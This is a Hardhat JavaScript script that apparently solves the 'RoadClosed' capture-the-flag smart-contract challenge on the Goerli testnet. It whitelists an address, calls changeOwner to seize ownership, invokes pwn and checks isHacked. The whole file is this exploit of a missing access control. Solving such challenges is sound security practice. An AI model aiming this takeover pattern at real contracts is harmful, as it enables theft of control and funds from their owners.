require("dotenv").config();
const { utils } = require("ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL);
  const wallet = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  const contractAddress = "0xD2372EB76C559586bE0745914e9538C17878E812";
  const roadClosed = await hre.ethers.getContractAt(
    "RoadClosed",
    contractAddress,
    wallet
  );
  const addToWhitelist = await roadClosed.addToWhitelist(
    "0x052f899e4e3fe467FDF76155548ac9ef8A1d5caf"
  );

  console.log(addToWhitelist.hash);
  const changeOwner = await roadClosed.changeOwner(
    "0x052f899e4e3fe467FDF76155548ac9ef8A1d5caf"
  );

  console.log(changeOwner.hash);

  const owner = await roadClosed.isOwner();
  console.log(owner);

  const pwn = await roadClosed["pwn(address)"](
    "0x052f899e4e3fe467FDF76155548ac9ef8A1d5caf"
  );

  console.log(pwn.hash);

  console.log("Done !");

  const hacked = await roadClosed.isHacked();
  console.log(hacked);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
